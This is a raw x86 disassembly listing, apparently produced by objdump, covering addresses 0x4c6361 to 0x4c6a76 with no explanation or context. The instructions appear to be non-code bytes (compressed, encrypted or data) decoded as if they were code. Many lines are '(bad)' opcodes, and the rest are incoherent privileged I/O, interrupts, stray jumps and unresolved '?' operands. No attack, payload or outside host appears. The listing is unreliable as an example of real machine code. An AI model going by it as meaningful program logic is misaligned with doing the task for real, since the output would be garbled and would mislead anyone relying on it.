  4c6361:	mov    esi,0xb7be438e
  4c6366:	pop    ss
  4c6367:	aad    0x8e
  4c6369:	mov    al,0x60
  4c636b:	call   0x7f233a13
  4c6370:	xchg   ebx,eax
  4c6371:	shl    DWORD PTR [ecx+0x38d8c2c4],1
  4c6377:	push   edx
  4c6378:	repnz fisttp WORD PTR [edi-0xf]
  4c637c:	addr16 mov ebx,0xff5767d1
  4c6382:	(bad)  
  4c6383:	(bad)  
  4c6384:	(bad)  
  4c6385:	mov    esp,0xb506dda6
  4c638a:	aas    
  4c638b:	dec    ebx
  4c638c:	ss mov dl,0x48
  4c638f:	fisubr DWORD PTR [ebx]
  4c6391:	or     eax,0xa1b4cd8
  4c6396:	scas   eax,DWORD PTR es:[edi]
  4c6397:	test   BYTE PTR [edx+0x3],0x36
  4c639b:	pusha  
  4c639c:	jp     0x4c63a2
  4c639e:	inc    ecx
  4c639f:	ret    
  4c63a0:	out    dx,eax
  4c63a1:	pusha  
  4c63a2:	fist   WORD PTR [ebp-0x21]
  4c63a5:	(bad)  
  4c63a6:	(bad)  
  4c63a7:	(bad)  
  4c63a8:	jmp    DWORD PTR [edi-0x58]
  4c63ab:	out    dx,eax
  4c63ac:	mov    gs,WORD PTR [esi+0x31]
  4c63af:	jns    0x4c636f
  4c63b1:	imul   eax,DWORD PTR [esi-0x74],0x1acb61b3
  4c63b8:	and    DWORD PTR [esi-0x44],0xffffffa0
  4c63bc:	shr    BYTE PTR [edi+0x25],cl
  4c63bf:	ss loop 0x4c642a
  4c63c2:	push   edx
  4c63c3:	xchg   ebp,eax
  4c63c4:	ja     0x4c63d2
  4c63c6:	int3   
  4c63c7:	add    eax,DWORD PTR [edi-0x1]
  4c63ca:	(bad)  
  4c63cb:	(bad)  
  4c63cc:	dec    DWORD PTR [ebx]
  4c63ce:	mov    ebx,0x220216b9
  4c63d3:	das    
  4c63d4:	es add eax,0xba3bbe55
  4c63da:	lds    ebp,FWORD PTR [eax]
  4c63dc:	or     edi,DWORD PTR [ebp-0x4ba56d4e]
  4c63e2:	sub    eax,DWORD PTR [edx+ebp*2]
  4c63e5:	mov    bl,0x5c
  4c63e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c63e8:	call   edi
  4c63ea:	ret    0xcf31
  4c63ed:	(bad)  
  4c63ee:	(bad)  
  4c63ef:	(bad)  
  4c63f0:	call   eax
  4c63f2:	mov    ch,0x8b
  4c63f4:	sahf   
  4c63f5:	fldcw  WORD PTR [ebx*1-0x4fa42152]
  4c63fc:	ret    0x9b64
  4c63ff:	es repnz arpl sp,bp
  4c6403:	pushf  
  4c6404:	mov    ds:0x930a756a,eax
  4c6409:	ins    DWORD PTR es:[edi],dx
  4c640a:	add    ch,BYTE PTR [ecx+0x3f9c0906]
  4c6410:	ss (bad) 
  4c6412:	dec    DWORD PTR [ebp-0x1]
  4c6415:	push   cs
  4c6416:	jmp    0x4c639d
  4c6418:	addr16 pop es
  4c641a:	jb     0x4c642f
  4c641c:	push   edi
  4c641d:	mov    ah,0x82
  4c641f:	dec    edx
  4c6420:	mov    edi,0xb87a1495
  4c6425:	loop   0x4c63d5
  4c6427:	sub    esi,DWORD PTR [ecx-0x49e4c785]
  4c642d:	or     al,0x9b
  4c642f:	(bad)  
  4c6430:	(bad)  
  4c6431:	(bad)  
  4c6432:	dec    DWORD PTR [esi-0x41f26d2e]
  4c6438:	aad    0xe5
  4c643a:	mov    bh,0xef
  4c643c:	fdivr  QWORD PTR [ecx+eiz*1-0x21]
  4c6440:	fisttp DWORD PTR [ebx]
  4c6442:	aam    0xd2
  4c6444:	rol    DWORD PTR [esi-0xe2b1dbe],cl
  4c644a:	clc    
  4c644b:	mov    bl,0xdd
  4c644d:	push   0x1fda836e
  4c6452:	int    0x85
  4c6454:	mov    ?,edi
  4c6456:	call   DWORD PTR [esi]
  4c6458:	mov    esi,0xb9265b81
  4c645d:	mul    cl
  4c645f:	ja     0x4c6411
  4c6461:	outs   dx,DWORD PTR ds:[esi]
  4c6462:	ja     0x4c64ab
  4c6464:	mov    bh,0x18
  4c6466:	out    0x5a,al
  4c6468:	cli    
  4c6469:	jo     0x4c646a
  4c646b:	jmp    FWORD PTR [edi-0x6c]
  4c646e:	adc    al,0xca
  4c6470:	cmp    eax,DWORD PTR [esi]
  4c6472:	pop    sp
  4c6474:	or     eax,DWORD PTR [ecx]
  4c6476:	adc    edi,edi
  4c6478:	sahf   
  4c6479:	(bad)
  4c647e:	clc    
  4c647f:	sar    edi,cl
  4c6481:	imul   esp,DWORD PTR [ecx-0x1],0xffffffff
  4c6485:	inc    DWORD PTR [ebp-0x78]
  4c6488:	ins    BYTE PTR es:[edi],dx
  4c6489:	push   ss
  4c648a:	js     0x4c646e
  4c648c:	or     ah,BYTE PTR [eax-0x28f22d12]
  4c6492:	push   esp
  4c6493:	add    DWORD PTR [esi+ecx*2],0xffffffc2
  4c6497:	mov    bl,0x3
  4c6499:	cmp    DWORD PTR [ecx+0x26],esp
  4c649c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4c649e:	not    DWORD PTR [esi]
  4c64a0:	pusha  
  4c64a1:	(bad)  
  4c64a2:	(bad)  
  4c64a3:	(bad)  
  4c64a4:	call   eax
  4c64a6:	dec    ebp
  4c64a7:	inc    edi
  4c64a8:	imul   ecx,DWORD PTR [ecx-0x25],0x4a3e6e77
  4c64af:	push   0xffffffd1
  4c64b1:	scas   al,BYTE PTR es:[edi]
  4c64b2:	fcomp  QWORD PTR [edx-0x2a]
  4c64b5:	fldenv [esi+0xb]
  4c64b8:	fild   WORD PTR [eax-0x10]
  4c64bb:	cmp    ebx,eax
  4c64bd:	aaa    
  4c64be:	push   ebx
  4c64bf:	scas   al,BYTE PTR es:[edi]
  4c64c0:	mov    esp,0xbb9ec5a9
  4c64c5:	(bad)  
  4c64c6:	(bad)  
  4c64c7:	(bad)  
  4c64c8:	(bad)  
  4c64c9:	fidivr WORD PTR [edi-0x31]
  4c64cc:	mov    dl,0x47
  4c64ce:	jmp    0x1c7d1ad2
  4c64d3:	repnz mov ebp,0xbac28abd
  4c64d9:	retf   0x9330
  4c64dc:	mov    bl,0x53
  4c64de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c64df:	mov    ds:0x360524b4,eax
  4c64e4:	sar    BYTE PTR [edx-0x28f96d],1
  4c64ea:	(bad)  
  4c64eb:	(bad)  
  4c64ec:	dec    ebp
  4c64ee:	sub    DWORD PTR [edi-0x22],edx
  4c64f1:	push   esp
  4c64f2:	mov    edi,0x2e23d967
  4c64f7:	jp     0x4c655f
  4c64f9:	mov    bl,0xb8
  4c64fb:	dec    edx
  4c64fc:	popa   
  4c64fd:	les    eax,FWORD PTR [edx]
  4c64ff:	sbb    ebp,DWORD PTR [eax+0x5d]
  4c6502:	xchg   esp,eax
  4c6503:	sub    ebp,DWORD PTR [edi+0x2a]
  4c6506:	aaa    
  4c6507:	mov    esi,0x8ea1b40b
  4c650c:	or     al,0x15
  4c650e:	mov    BYTE PTR [esi-0x20e43c01],ch
  4c6514:	add    eax,0x2ef8d5a
  4c6519:	sub    eax,0xee0505cf
  4c651e:	mov    cl,0x9e
  4c6520:	dec    eax
  4c6521:	dec    esi
  4c6522:	into   
  4c6523:	pop    edi
  4c6524:	(bad)  
  4c6525:	(bad)  
  4c6526:	call   DWORD PTR [ecx+ebx*4]
  4c6529:	dec    esp
  4c652a:	push   ebx
  4c652b:	or     al,BYTE PTR [esi-0x5c82b72a]
  4c6531:	dec    eax
  4c6532:	dec    ebx
  4c6533:	mov    esi,0xa94a6c98
  4c6538:	and    BYTE PTR [edx],0x19
  4c653b:	stos   DWORD PTR es:[edi],eax
  4c653c:	sub    BYTE PTR [edi],dl
  4c653e:	fist   WORD PTR [edx+0x4fb6b947]
  4c6544:	pop    es
  4c6545:	or     DWORD PTR [esi],esp
  4c6547:	pop    ss
  4c6548:	and    ch,bl
  4c654a:	pop    edi
  4c654b:	add    al,BYTE PTR [edx]
  4c654d:	in     al,0x42
  4c654f:	scas   al,BYTE PTR es:[edi]
  4c6550:	test   BYTE PTR [edi+0x5f],0x0
  4c6554:	add    edx,eax
  4c6556:	jo     0x4c651d
  4c6558:	scas   al,BYTE PTR es:[edi]
  4c6559:	add    al,0xbf
  4c655b:	or     edi,DWORD PTR [edi]
  4c655d:	sub    eax,DWORD PTR [edx-0x8f8e895]
  4c6563:	pop    es
  4c6564:	pop    ds
  4c6565:	sub    eax,0x792ae08
  4c656a:	or     bh,bh
  4c656c:	sub    ebp,DWORD PTR [eax]
  4c656e:	pop    esi
  4c656f:	test   al,0x7
  4c6571:	dec    edi
  4c6572:	mov    edi,0x902e1a2d
  4c6577:	or     cl,BYTE PTR [ebx]
  4c6579:	lahf   
  4c657a:	xchg   ebp,eax
  4c657b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c657c:	adc    BYTE PTR [edi+ebp*8],dl
  4c657f:	in     al,dx
  4c6580:	iret   
  4c6581:	repz cmp al,0xed
  4c6584:	add    BYTE PTR [eax+0x68707806],0x5c
  4c658b:	push   eax
  4c658c:	cmp    al,0xcf
  4c658e:	repz cmp al,0x40
  4c6591:	xor    al,0x28
  4c6593:	sbb    al,0x14
  4c6595:	jns    0x4c6531
  4c6597:	iret   
  4c6598:	repz or BYTE PTR [eax],al
  4c659b:	hlt    
  4c659c:	jg     0x4c658a
  4c659e:	loopne 0x4c6587
  4c65a0:	jns    0x4c6540
  4c65a2:	out    0xd8,eax
  4c65a4:	les    ebp,FWORD PTR [eax-0x18617368]
  4c65aa:	jns    0x4c654a
  4c65ac:	js     0x4c6616
  4c65ae:	push   esp
  4c65af:	cmp    BYTE PTR [eax],dh
  4c65b1:	and    al,0xe7
  4c65b3:	fucom  st(7)
  4c65b5:	jns    0x4c65cf
  4c65b7:	or     ah,bh
  4c65b9:	jle    0x4c6639
  4c65bb:	push   es
  4c65bc:	loopne 0x4c655c
  4c65be:	out    0x79,eax
  4c65c0:	sahf   
  4c65c1:	rol    al,1
  4c65c3:	mov    ah,0xa8
  4c65c5:	pushf  
  4c65c6:	mov    WORD PTR [ecx-0x62],?
  4c65c9:	out    0x79,eax
  4c65cb:	xor    BYTE PTR [esp+eiz*2+0x58],0x19
  4c65d0:	or     al,0xbc
  4c65d2:	push   ss
  4c65d3:	out    dx,eax
  4c65d4:	ins    BYTE PTR es:[edi],dx
  4c65d5:	push   edi
  4c65d6:	push   esp
  4c65d7:	imul   esp,DWORD PTR [ebx+0x62],0xecf8001
  4c65de:	and    BYTE PTR [edx+edi*4+0x9],cl
  4c65e2:	add    DWORD PTR [ebx-0x7d],edi
  4c65e5:	retf   
  4c65e6:	(bad)  
  4c65e7:	aad    0x43
  4c65e9:	add    DWORD PTR [edi+0x606028d6],eax
  4c65ef:	outs   dx,DWORD PTR ds:[esi]
  4c65f0:	adc    dh,BYTE PTR [edi-0x2a725eea]
  4c65f6:	aaa    
  4c65f7:	pop    ss
  4c65f8:	pusha  
  4c65f9:	xchg   DWORD PTR [ecx-0x74f0c840],eax
  4c65ff:	aad    0xae
  4c6601:	push   0xffffffc7
  4c6603:	ja     0x4c6640
  4c6605:	mov    bh,0x8b
  4c6607:	lods   eax,DWORD PTR ds:[esi]
  4c6608:	rol    BYTE PTR [esi+0x20],1
  4c660b:	out    dx,eax
  4c660c:	aaa    
  4c660d:	jne    0x4c65bc
  4c660f:	inc    esi
  4c6610:	sbb    eax,DWORD PTR [edi+0x7]
  4c6613:	sbb    al,0x5b
  4c6615:	mov    ds:0x437af8d,eax
  4c661a:	rcl    BYTE PTR ss:[edx-0x65],cl
  4c661e:	xor    ebp,DWORD PTR [edi-0x4b]
  4c6621:	sub    eax,0x6f67956d
  4c6626:	fistp  QWORD PTR [ebx]
  4c6628:	dec    ebx
  4c6629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c662a:	lea    ebp,[ebp-0x59]
  4c662d:	mov    ebx,0x1b60b66f
  4c6632:	push   edx
  4c6633:	das    
  4c6634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c6635:	jae    0x4c65c4
  4c6637:	add    eax,0x82a7d88c
  4c663c:	fsubr  DWORD PTR [esi+0x754f5536]
  4c6642:	cmp    ecx,DWORD PTR [eax]
  4c6644:	outs   dx,DWORD PTR ds:[esi]
  4c6645:	(bad)  
  4c6646:	rcl    BYTE PTR [esi],1
  4c6648:	(bad)  
  4c664a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c664b:	inc    eax
  4c664c:	inc    esi
  4c664d:	push   0xffffff89
  4c664f:	fldcw  WORD PTR [edi+0x37]
  4c6652:	ins    DWORD PTR es:[edi],dx
  4c6653:	lods   al,BYTE PTR ds:[esi]
  4c6654:	lods   eax,DWORD PTR ds:[esi]
  4c6655:	(bad)  [edi-0x274724c9]
  4c665b:	call   0x2e93:0x1b086f17
  4c6662:	xor    eax,0xb508076f
  4c6667:	adc    eax,0xf7fb6a8c
  4c666c:	cmp    esp,DWORD PTR [edx]
  4c666e:	mov    ah,0x45
  4c6670:	jno    0x4c6676
  4c6672:	getsec 
  4c6674:	ins    DWORD PTR es:[edi],dx
  4c6675:	push   esp
  4c6676:	pop    esp
  4c6677:	in     eax,dx
  4c6678:	(bad)  
  4c667a:	add    al,0xef
  4c667c:	aaa    
  4c667d:	ins    DWORD PTR es:[edi],dx
  4c667e:	jno    0x4c665b
  4c6680:	dec    eax
  4c6681:	iret   
  4c6682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c6683:	rcl    DWORD PTR [esi+0x1],0xa0
  4c6687:	daa    
  4c6688:	aaa    
  4c6689:	mov    al,ds:0x77c81700
  4c668e:	add    ch,BYTE PTR [edi]
  4c6690:	scas   eax,DWORD PTR es:[edi]
  4c6691:	xor    cl,0xaf
  4c6694:	and    al,0x49
  4c6696:	cmp    ah,BYTE PTR fs:[eax]
  4c6699:	jno    0x4c661b
  4c669b:	push   0xbb2c682e
  4c66a0:	inc    edx
  4c66a1:	(bad)  
  4c66a2:	push   DWORD PTR [esi+0x20]
  4c66a5:	xor    DWORD PTR [esi],ebp
  4c66a7:	xor    DWORD PTR [eax],esp
  4c66a9:	xor    dh,BYTE PTR [eax]
  4c66ab:	xor    BYTE PTR [esi+ebp*2],dh
  4c66ae:	das    
  4c66af:	xor    DWORD PTR ds:0xdfffe21c,esi
  4c66b5:	jle    0x4c66f0
  4c66b7:	cmp    dh,BYTE PTR ds:0x10333a30
  4c66bd:	push   0x6f
  4c66bf:	outs   dx,BYTE PTR ds:[esi]
  4c66c0:	bound  esp,QWORD PTR [ebp+0x6e]
  4c66c3:	outs   dx,BYTE PTR ds:[esi]
  4c66c4:	gs je  0x4c673b
  4c66c7:	and    BYTE PTR [ebp+0x78],al
  4c66ca:	jo     0x4c66ec
  4c66cc:	and    al,0xa7
  4c66ce:	adc    eax,0xc1f30ea
  4c66d3:	popa   
  4c66d4:	cs pusha 
  4c66d6:	push   es
  4c66d7:	lock sahf 
  4c66d9:	out    0x79,eax
  4c66db:	sahf   
  4c66dc:	call   0xb91133b9
  4c66e1:	mov    al,0x79
  4c66e3:	sahf   
  4c66e4:	out    0x79,eax
  4c66e6:	mov    al,ds:0x80889098
  4c66eb:	out    0x79,eax
  4c66ed:	sahf   
  4c66ee:	out    0x78,eax
  4c66f0:	jo     0x4c675a
  4c66f2:	pusha  
  4c66f3:	pop    eax
  4c66f4:	sahf   
  4c66f5:	out    0x79,eax
  4c66f7:	sahf   
  4c66f8:	push   eax
  4c66f9:	dec    eax
  4c66fa:	inc    eax
  4c66fb:	xor    al,0x2c
  4c66fd:	sbb    al,0x3c
  4c66ff:	int    0xe7
  4c6701:	jns    0x4c6713
  4c6703:	add    al,0xf8
  4c6705:	pop    edi
  4c6706:	in     al,dx
  4c6707:	loopne 0x4c66fc
  4c6709:	cmp    al,0xcf
  4c670b:	repz fcom st(0)
  4c670e:	mov    eax,0xf3cfa0ac
  4c6713:	cmp    al,0xcf
  4c6715:	mov    BYTE PTR [eax+0x6c],bh
  4c6718:	pusha  
  4c6719:	dec    esp
  4c671a:	cmp    al,0x34
  4c671c:	loopne 0x4c6711
  4c671e:	cmp    al,0x2c
  4c6720:	sbb    al,0xc
  4c6722:	pop    edi
  4c6723:	push   ds
  4c6724:	pop    esi
  4c6725:	iret   
  4c6726:	repz cmp al,0xcf
  4c6729:	push   es
  4c672a:	fmul   st(4),st
  4c672c:	mov    esp,0xcf3c94ac
  4c6731:	repz cmp al,0x80
  4c6734:	ins    BYTE PTR es:[edi],dx
  4c6735:	pop    eax
  4c6736:	inc    esp
  4c6737:	xor    al,0xf9
  4c6739:	cmp    al,0xcf
  4c673b:	repz sub BYTE PTR [eax+edx*1],bl
  4c673f:	add    al,0xf4
  4c6741:	pop    ebp
  4c6742:	out    0x79,eax
  4c6744:	sahf   
  4c6745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c6746:	in     al,0xd8
  4c6748:	shl    BYTE PTR [esp+eax*4-0x61861833],0x64
  4c6750:	dec    eax
  4c6751:	sub    BYTE PTR [eax+ebp*8],al
  4c6754:	pop    esp
  4c6755:	sar    BYTE PTR [edi+ecx*8],1
  4c6758:	repz cmp al,0xb8
  4c675b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c675c:	mov    WORD PTR [esp+ebx*2+0x69],?
  4c6760:	ds iret 
  4c6762:	repz cmp BYTE PTR [eax],ah
  4c6765:	add    al,0xec
  4c6767:	pop    ebx
  4c6768:	aam    0xe7
  4c676a:	jns    0x4c670a
  4c676c:	out    0xb8,eax
  4c676e:	pushf  
  4c676f:	and    BYTE PTR [eax+0x40],0xcd
  4c6773:	out    0x79,eax
  4c6775:	sahf   
  4c6776:	sub    al,0x1c
  4c6778:	or     al,0x0
  4c677a:	in     al,dx
  4c677b:	pop    edx
  4c677c:	fdivr  QWORD PTR [edi+ecx*8]
  4c677f:	repz cmp al,0xc8
  4c6782:	mov    eax,0xd48c94a4
  4c6787:	mov    ch,BYTE PTR [esi-0x20]
  4c678a:	pop    edi
  4c678b:	mov    bl,0x51
  4c678d:	xor    eax,0x2b639c30
  4c6792:	or     al,0x5f
  4c6794:	mov    eax,ds:0x808ff8c
  4c6799:	cs sub BYTE PTR cs:[ebx],ah
  4c679d:	or     eax,0x24331b1b
  4c67a2:	sub    eax,0xbf1942d
  4c67a7:	(bad)  
  4c67a8:	and    eax,0x20272122
  4c67ad:	or     DWORD PTR [esi],esp
  4c67af:	pop    sp
  4c67b1:	xchg   ecx,eax
  4c67b2:	nop
  4c67b3:	add    edx,DWORD PTR [ebx]
  4c67b5:	adc    al,0x64
  4c67b7:	xor    al,0x10
  4c67b9:	sub    ecx,DWORD PTR [edi+0x4aa35d6c]
  4c67bf:	(bad)  
  4c67c0:	scas   eax,DWORD PTR es:[edi]
  4c67c1:	sub    cl,BYTE PTR ds:0x330b5f0e
  4c67c7:	xchg   edx,eax
  4c67c8:	xor    DWORD PTR [eax],esi
  4c67ca:	add    DWORD PTR [ecx],0x460054e4
  4c67d0:	jecxz  0x4c677f
  4c67d2:	dec    ecx
  4c67d3:	(bad)  
  4c67d5:	lods   eax,DWORD PTR ds:[esi]
  4c67d6:	dec    esi
  4c67d7:	adc    eax,0x65e555c
  4c67dc:	inc    eax
  4c67dd:	lahf   
  4c67de:	out    0x79,eax
  4c67e0:	sahf   
  4c67e1:	xor    al,0x28
  4c67e3:	sbb    BYTE PTR [eax+eax*1],cl
  4c67e6:	hlt    
  4c67e7:	push   esp
  4c67e8:	cmp    al,0xcf
  4c67ea:	repz xor al,0xe8
  4c67ed:	(bad)  
  4c67ef:	les    edi,FWORD PTR [eax-0xc30c30d]
  4c67f5:	test   al,0x9c
  4c67f7:	mov    WORD PTR [esp+esi*2-0x31],?
  4c67fb:	repz cmp al,0xcf
  4c67fe:	push   0x3844545c
  4c6803:	sub    BYTE PTR [esi+0x143cf3e6],bl
  4c6809:	add    al,0xf4
  4c680b:	push   ebx
  4c680c:	loopne 0x4c67da
  4c680e:	jns    0x4c67ae
  4c6810:	out    0x79,eax
  4c6812:	mov    eax,0x748494a8
  4c6817:	stc    
  4c6818:	jge    0x4c6824
  4c681a:	out    0x68,eax
  4c681c:	mov    cl,BYTE PTR [ebx]
  4c681e:	add    al,BYTE PTR [edx]
  4c6820:	add    BYTE PTR [edx],dl
  4c6822:	push   0x13e5cf6c
  4c6827:	add    ecx,DWORD PTR [edx+ecx*4]
  4c682a:	add    BYTE PTR ds:0x8de12eb5,dl
  4c6830:	pop    edx
  4c6831:	push   ss
  4c6832:	push   ds
  4c6833:	push   0x8
  4c6835:	aaa    
  4c6836:	pop    esi
  4c6837:	jge    0x4c6887
  4c6839:	mov    edx,0x13091303
  4c683e:	and    BYTE PTR [esi-0x5df6b77f],cl
  4c6844:	pusha  
  4c6845:	and    eax,DWORD PTR ss:[eax]
  4c6848:	mov    ds:0xaad0088,al
  4c684d:	inc    ebp
  4c684e:	adc    eax,0x150043c8
  4c6853:	aam    0x19
  4c6855:	jmp    FWORD PTR [ecx-0x1bf5d6]
  4c685b:	(bad)  
  4c685c:	dec    DWORD PTR [eax]
  4c685e:	mov    al,ds:0x11055a82
  4c6863:	inc    eax
  4c6864:	add    eax,0xa8022b2
  4c6869:	fs inc ebp
  4c686b:	add    BYTE PTR ds:0x2a008bc8,dl
  4c6871:	nop
  4c6872:	push   ss
  4c6873:	add    DWORD PTR [eax+eiz*1+0x2c],edx
  4c6877:	add    ch,BYTE PTR [eax+0x50045940]
  4c687d:	xor    DWORD PTR [edx+0x6402a008],0xc8054011
  4c6887:	and    al,BYTE PTR [eax+0x45900a]
  4c688d:	adc    eax,0x2a008b20
  4c6892:	inc    eax
  4c6893:	push   ss
  4c6894:	add    DWORD PTR [ecx+eax*4+0x2c],edx
  4c6898:	add    ch,BYTE PTR [eax+0x50045902]
  4c689e:	add    BYTE PTR [edx+0x6d27a008],dh
  4c68a4:	or     al,0x14
  4c68a6:	nop
  4c68a7:	and    ebp,DWORD PTR [edi-0x5497fa57]
  4c68ad:	xor    DWORD PTR [ebx+0x34],ebx
  4c68b0:	adc    eax,eax
  4c68b2:	shl    BYTE PTR [edi+0x48c3263f],1
  4c68b8:	add    al,0x30
  4c68ba:	inc    ebx
  4c68bb:	and    BYTE PTR [ecx-0x5770bd05],0x0
  4c68c2:	inc    ebp
  4c68c3:	ss pop edi
  4c68c5:	adc    ch,BYTE PTR gs:[edi]
  4c68c8:	stos   DWORD PTR es:[edi],eax
  4c68c9:	add    DWORD PTR [eax],eax
  4c68cb:	inc    DWORD PTR [eax+eax*1]
  4c68ce:	dec    esp
  4c68cf:	push   0xffffffda
  4c68d1:	mov    eax,0x80cc0af2
  4c68d6:	add    al,0xa2
  4c68d8:	add    BYTE PTR [edi-0x4d],bl
  4c68db:	rcl    eax,1
  4c68dd:	mul    DWORD PTR [esi+0x2370e649]
  4c68e3:	and    BYTE PTR [esi-0x28ef2262],al
  4c68e9:	or     bh,dh
  4c68eb:	add    DWORD PTR [ebp+0x20],ecx
  4c68ee:	add    esp,DWORD PTR [ecx]
  4c68f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c68f1:	add    DWORD PTR [edi-0x4c197261],ecx
  4c68f7:	in     eax,dx
  4c68f8:	addr16 out 0x3,eax
  4c68fb:	add    dl,BYTE PTR [eax+0x7]
  4c68fe:	add    BYTE PTR [ebx-0x5d510e4c],dl
  4c6904:	jb     0x4c68f0
  4c6906:	add    eax,DWORD PTR [eax]
  4c6908:	jmp    0xb3cc:0xc1dac182
  4c690f:	ins    DWORD PTR es:[edi],dx
  4c6910:	pop    edi
  4c6911:	add    DWORD PTR [esi-0x7d],eax
  4c6914:	pop    ebp
  4c6915:	jle    0x4c68f5
  4c6917:	adc    DWORD PTR [esi+0x38],0x81e9000c
  4c691e:	aas    
  4c691f:	fwait
  4c6920:	mov    ebx,0x201b60f
  4c6925:	push   eax
  4c6926:	adc    BYTE PTR [edx],bl
  4c6928:	xor    al,BYTE PTR [eax]
  4c692a:	push   cs
  4c692b:	push   ss
  4c692c:	aas    
  4c692d:	bound  ecx,QWORD PTR [edi+0x0]
  4c6930:	leave  
  4c6931:	leave  
  4c6932:	jae    0x4c68e4
  4c6934:	dec    ebx
  4c6935:	inc    edi
  4c6936:	add    BYTE PTR [edi+0x2],dl
  4c6939:	(bad)  
  4c693a:	push   eax
  4c693b:	fcmovnb st,st(6)
  4c693d:	inc    ebx
  4c693e:	pop    ebx
  4c693f:	ins    BYTE PTR es:[edi],dx
  4c6940:	xor    BYTE PTR [eax+edx*2],cl
  4c6943:	sbb    edi,DWORD PTR [ebx]
  4c6945:	sub    BYTE PTR [ebx-0x60],ah
  4c6948:	lds    esi,FWORD PTR [eax+0x70]
  4c694b:	sub    DWORD PTR [edx-0x276bfcf4],ecx
  4c6951:	mov    ds:0x1b9e714,eax
  4c6956:	xor    edx,DWORD PTR [eax]
  4c6958:	ror    BYTE PTR [ebp+0x4a649b82],1
  4c695e:	add    DWORD PTR [edx+0x1f8a6b54],edi
  4c6964:	mov    esp,0x739bcf6b
  4c6969:	cs popa 
  4c696b:	imul   ebx,DWORD PTR [ebx+0x62],0x53
  4c696f:	hlt    
  4c6970:	lock fnstsw WORD PTR [ebx]
  4c6973:	push   es
  4c6974:	inc    ebx
  4c6975:	adc    bh,BYTE PTR [edi-0x4a4edc8b]
  4c697b:	xchg   DWORD PTR [edx],esi
  4c697d:	stos   DWORD PTR es:[edi],eax
  4c697e:	push   ebx
  4c697f:	imul   edi,DWORD PTR [edi],0x55
  4c6982:	add    dh,ah
  4c6984:	xor    DWORD PTR [ecx+0x7],ebp
  4c6987:	aaa    
  4c6988:	not    DWORD PTR [esi-0x25]
  4c698b:	(bad)  
  4c698c:	imul   ebx,DWORD PTR [edi+0x1a],0xad003220
  4c6993:	xchg   edx,eax
  4c6994:	mov    eax,ds:0xc1700763
  4c6999:	pop    ebx
  4c699a:	mov    bl,0x13
  4c699c:	or     ch,BYTE PTR [ecx+0x1f]
  4c699f:	jb     0x4c69b2
  4c69a1:	rcl    bh,cl
  4c69a3:	push   esi
  4c69a4:	xor    edi,DWORD PTR [esi]
  4c69a6:	jb     0x4c693f
  4c69a8:	addr16 rcr esi,cl
  4c69ab:	aaa    
  4c69ac:	push   ebp
  4c69ad:	cmp    esp,DWORD PTR [ebx+0x33]
  4c69b0:	jbe    0x4c6a31
  4c69b2:	out    0x69,eax
  4c69b4:	mov    dh,0xf6
  4c69b6:	ins    DWORD PTR es:[edi],dx
  4c69b7:	js     0x4c6968
  4c69b9:	push   ebx
  4c69ba:	fbstp  TBYTE PTR [edx-0x31]
  4c69bd:	mov    bl,0x6d
  4c69bf:	jne    0x4c69cc
  4c69c1:	shl    bl,cl
  4c69c3:	jae    0x4c69cd
  4c69c5:	push   ss
  4c69c6:	fdiv   QWORD PTR [esi+0x2b777bcb]
  4c69cc:	and    esp,eax
  4c69ce:	mov    cl,0x0
  4c69d0:	and    eax,0x9d256207
  4c69d5:	adc    BYTE PTR [edi+eiz*2+0x56906602],0xb1
  4c69dd:	popa   
  4c69de:	pop    ebx
  4c69df:	daa    
  4c69e0:	fnsave [ebp+0x73b752a1]
  4c69e6:	mov    edi,0x6d4025f
  4c69eb:	add    DWORD PTR [eax],eax
  4c69ed:	retf   
  4c69ee:	sub    BYTE PTR es:[esi],dl
  4c69f1:	aaa    
  4c69f2:	aam    0x16
  4c69f4:	iret   
  4c69f5:	push   eax
  4c69f6:	push   cs
  4c69f7:	cli    
  4c69f8:	mov    ch,0xc
  4c69fa:	ins    DWORD PTR es:[edi],dx
  4c69fb:	aas    
  4c69fc:	pop    ebx
  4c69fd:	fs pop ebx
  4c69ff:	fistp  WORD PTR [edx]
  4c6a01:	and    al,0x60
  4c6a03:	sbb    BYTE PTR [edi+0x23],al
  4c6a06:	and    BYTE PTR [eax-0x1d0def9f],al
  4c6a0c:	push   esp
  4c6a0d:	(bad)  [edx+0x1a]
  4c6a10:	mov    edx,0x33c76298
  4c6a15:	add    eax,0x2b0dc0c1
  4c6a1a:	neg    BYTE PTR [ebx+0x8]
  4c6a1d:	push   0xd76ec76d
  4c6a22:	mov    esi,eax
  4c6a24:	sub    BYTE PTR [ebx+0x1b],al
  4c6a27:	stos   DWORD PTR es:[edi],eax
  4c6a28:	pop    ss
  4c6a29:	(bad)  
  4c6a2b:	loope  0x4c6a8a
  4c6a2d:	pop    ebx
  4c6a2e:	push   ebx
  4c6a2f:	sbb    ah,BYTE PTR [ebp+0x4f]
  4c6a32:	inc    esp
  4c6a33:	push   ebx
  4c6a34:	inc    ebx
  4c6a35:	loope  0x4c6a1a
  4c6a37:	rol    DWORD PTR ds:0x64472863,0xbb
  4c6a3e:	mov    ah,0xe3
  4c6a40:	or     ah,BYTE PTR [esi+0x665361f7]
  4c6a46:	adc    edi,DWORD PTR [edx-0x7ccb3be3]
  4c6a4c:	and    BYTE PTR [ebx],bh
  4c6a4e:	arpl   WORD PTR [ebp-0x10c78bce],dx
  4c6a54:	shl    WORD PTR [edx],cl
  4c6a57:	push   es
  4c6a58:	pusha  
  4c6a59:	or     BYTE PTR [ebx-0x2b8d97d2],ah
  4c6a5f:	retf   0x42eb
  4c6a62:	retf   0xf64
  4c6a65:	sar    DWORD PTR [edx],cl
  4c6a67:	or     BYTE PTR [edi-0x25],ah
  4c6a6a:	and    al,BYTE PTR [eax]
  4c6a6c:	inc    esi
  4c6a6d:	sbb    DWORD PTR [ebx],0x22e71dd3
  4c6a73:	out    0x37,eax
  4c6a75:	pop    ebx
  4c6a76:	mov    cl,0xf
